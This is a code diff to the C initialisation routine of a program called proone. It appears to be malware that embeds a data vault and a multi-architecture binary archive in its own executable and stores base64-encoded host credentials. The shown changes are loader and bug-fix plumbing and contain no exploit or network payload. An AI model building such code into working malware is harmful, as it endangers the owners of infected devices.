@@ -17,6 +17,7 @@
 #include <elf.h>
 
 #include <mbedtls/sha256.h>
+#include <mbedtls/base64.h>
 
 #include "config.h"
 #include "proone.h"
@@ -214,11 +215,6 @@ static void setup_dvault (void) {
 	prne_init_dvault(prne_g.m_dvault);
 }
 
-static bool setup_binarch (const void *m) {
-	// TODO: Load bin arc
-	return false;
-}
-
 static void init_proone (const char *self) {
 	int fd;
 #if PRNE_HOST_WORDSIZE == 64
@@ -277,18 +273,12 @@ static void init_proone (const char *self) {
 	prne_g.dvault_size =
 		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 0] << 8 |
 		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 1] << 0;
-	binarch_size =
-		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 4] << 24 |
-		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 5] << 16 |
-		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 6] << 8 |
-		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 7] << 0;
 
-	dvault_ofs = prne_salign_next(
-		prne_g.exec_size + 8,
+	dvault_ofs = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT) + 8;
+	binarch_ofs = dvault_ofs + prne_salign_next(
+		prne_g.dvault_size,
 		PRNE_BIN_ALIGNMENT);
-	binarch_ofs = prne_salign_next(
-		dvault_ofs + prne_g.dvault_size,
-		PRNE_BIN_ALIGNMENT);
+	binarch_size = file_size - binarch_ofs;
 
 	// Load dvault
 	prne_assert(dvault_ofs + prne_g.dvault_size <= (size_t)file_size);
@@ -296,10 +286,12 @@ static void init_proone (const char *self) {
 	setup_dvault();
 
 	if (binarch_size > 0) {
-		prne_assert(binarch_ofs + binarch_size <= (size_t)file_size);
-		setup_binarch(prne_g.m_exec + binarch_ofs);
+		prne_g.bin_ready = prne_index_bin_archive(
+			prne_g.m_exec + binarch_ofs,
+			binarch_size,
+			&prne_g.bin_archive) == PRNE_PACK_RC_OK;
 	}
-	else {
+	if (!prne_g.bin_ready) {
 		prne_dbgpf("* This executable has no binary archive!\n");
 	}
 #undef ELF_EHDR_TYPE
@@ -461,7 +453,7 @@ static bool format_shared_global (const int fd) {
 }
 
 static void skel_shared_global (struct prne_shared_global *skel) {
-	prne_memzero(skel, sizeof(skel));
+	prne_memzero(skel, sizeof(struct prne_shared_global));
 	// Future code for new shared_global format goes here
 	skel->rev = 0;
 }
@@ -681,7 +673,13 @@ static void set_host_credential (const char *str) {
 		return;
 	}
 
-	strncpy(prne_s_g->host_cred_data, str, sizeof(prne_s_g->host_cred_data) - 1);
+	// TODO: test
+	mbedtls_base64_decode(
+		prne_s_g->host_cred_data,
+		sizeof(prne_s_g->host_cred_data),
+		&prne_s_g->host_cred_len,
+		(const unsigned char*)str,
+		strlen(str));
 }
 
 static void run_ny_bin (void) {
